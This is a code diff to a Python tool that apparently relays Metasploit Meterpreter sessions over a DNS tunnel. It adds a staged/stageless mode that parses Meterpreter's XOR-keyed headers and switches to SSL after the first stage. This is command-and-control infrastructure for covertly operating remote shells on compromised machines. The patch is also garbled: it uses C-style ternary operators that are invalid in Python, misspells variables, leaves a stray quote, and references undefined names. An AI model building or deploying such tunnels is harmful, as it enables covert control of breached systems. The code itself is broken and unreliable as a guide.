@@ -198,6 +198,7 @@ class Client(object):
     INITIAL = 1
     INCOMING_DATA = 2
 
+
     def __init__(self, name):
         register_client(name, self)
         self.state = self.INITIAL
@@ -533,6 +534,7 @@ class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
 
 class MSFClient(object):
     HEADER_SIZE = 8
+    HEADER_STAGE_SIZE = 4
     BUFFER_SIZE = 2048
 
     INITIAL = 1
@@ -540,18 +542,22 @@ class MSFClient(object):
 
     LOGGER = logging.getLogger("MSFClient")
 
-    def __init__(self, sock, server):
+    def __init__(self, sock, server, stageles):
         self.sock = sock
+        seld.stageles =  stageles
         self.ssl_socket = None
         self.data = ""
         self.need_read_size = 0
         self.state = MSFClient.INITIAL
         self.server = server
-        self.client_id = 'a'
+        self.client_id = 'a' # TODO
         client = get_client_by_id(self.client_id)
         client.set_server(self)
-        self._setup_ssl()
-
+        
+        if self.stageles:
+            self._setup_ssl()
+        else:
+            MSFClient.LOGGER.info("STAGE0 mode ready")
     def get_socket(self):
         return self.ssl_socket if self.ssl_socket else self.sock
 
@@ -575,8 +581,8 @@ class MSFClient(object):
     def _read_data(self, size):
         data = None
         try:
-            data = self.ssl_socket.recv(size)
-            if not data:
+            data = self.get_socket().recv(size)
+            if not data and self.stageles:
                 MSFClient.LOGGER.info("SSL connection closed by client")
                 # self.ssl_socket.unwrap()
                 self.ssl_socket = None
@@ -596,33 +602,36 @@ class MSFClient(object):
     def need_read(self):
         if self.state == MSFClient.INITIAL:
             # read header
-            header = self._read_data(MSFClient.HEADER_SIZE)
+            header = self._read_data( self.stageles ? MSFClient.HEADER_SIZE : MSFClient.HEADER_STAGE_SIZE)
 
             if header is None:
                 return
 
-            if len(header) != MSFClient.HEADER_SIZE:
+            if (len(header) != self.stageles ? MSFClient.HEADER_SIZE : MSFClient.HEADER_STAGE_SIZE):
                 MSFClient.LOGGER.error("Can't read full header)")
                 return
             MSFClient.LOGGER.debug("PARSE HEADER")
-            xor_key = header[:4][::-1]
-            header_length = xor_bytes(xor_key, header[4:8])
-            pkt_length = struct.unpack('>I', header_length)[0] - 4
-            MSFClient.LOGGER.info("incoming packet - need to read %d data", pkt_length)
-            self.need_read_size = pkt_length
-            self.data = header
-
+            
+            if self.stagles:
+                xor_key = header[:4][::-1]
+                header_length = xor_bytes(xor_key, header[4:8])
+                pkt_length = struct.unpack('>I', header_length)[0] - 4
+                MSFClient.LOGGER.info("STAGELES incoming packet - need to read %d data", pkt_length)
+                self.need_read_size = pkt_length
+                self.data = header
+            else:
+                self.need_read_size = header[:4][::-1]
+                MSFClient.LOGGER.info("STAGE0 incoming packet - need to read %d data", self.need_read_size")
+                
             # try read immediately
             data = self._read_data(self.need_read_size)
             if data is None:
                 return
             self.data += data
             self.need_read_size -= len(data)
-
+            self.state = MSFClient.RECEIVING_DATA
             if self.need_read_size == 0:
-                self.send_to_client(self.client_id)
-            else:
-                self.state = MSFClient.RECEIVING_DATA
+                self.send_to_client(self.client_id)       
         else:
             data = self._read_data(self.need_read_size)
             if data is None:
@@ -648,10 +657,17 @@ class MSFClient(object):
         if client:
             client.server_put_data(self.data)
         else:
-            MSFClient.LOGGER.error("Client with id %s is not found.Dropping data", client_id)
+            MSFClient.LOGGER.info("Client with id %s is not found.Dropping data", client_id)
         self.data = ""
         self.need_read_size = 0
-        self.state = MSFClient.INITIAL
+        
+        if not self.stageles:
+            MSFClient.LOGGER.info("STAGE0 --> STAGE1 (STAGELES)")
+            self._setup_ssl()
+            self.stageles = True
+            
+        else:
+            self.state = MSFClient.INITIAL
 
     def write_data(self):
         client = get_client_by_id(self.client_id)
@@ -669,6 +685,7 @@ class Server(object):
     SELECT_TIMEOUT = 10
 
     def __init__(self, listen_addr="0.0.0.0", listen_port=4444):
+        self.stageles = payload_type
         self.listen_addr = listen_addr
         self.listen_port = listen_port
         self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -722,7 +739,7 @@ class Server(object):
                 if s is self.listen_socket:
                     connection, address = s.accept()
                     self.logger.info("Incoming connection from address %s", address)
-                    self.clients.append(MSFClient(connection, self))
+                    self.clients.append(MSFClient(connection, self, self.stageles))
                 elif s is self.poll_pipe[0]:
                     self.logger.info("Polling")
                     s.read(1)
@@ -774,6 +791,7 @@ def main():
     parser.add_argument('--lport', default=4444, type=int, help='The Meterpreter port to listen on.')
     parser.add_argument('--domain', type=str, required=True, help='The domain name')
     parser.add_argument('--ipaddr', type=str, required=True, help='DNS IP')
+    parser.add_argument('--type', type=str, required=True, help='type: singles, stagers')
 
     args = parser.parse_args()
     ns_records = []
@@ -782,12 +800,15 @@ def main():
     D = DomainName(args.domain + '.')  # Init domain string
     ns_records.append(NS(D.ns1))
     ns_records.append(NS(D.ns2))
-
-    client = Client('a')
+    
+    payload_type = args.type.find('sigle') ? True : False
+    
+    client = Client('a', payload_type) # TODO: multiclient support?
+    
     dns_server = DnsServer(args.domain, args.ipaddr, ns_records)
-    server = Server('0.0.0.0', args.lport)
+    server = Server('0.0.0.0', args.lport, payload_type)
     server.start_loop()
-
+    
     logger.info("Starting nameserver...")
 
     servers.append(SocketServer.ThreadingUDPServer(('', args.dport), UDPRequestHandler))
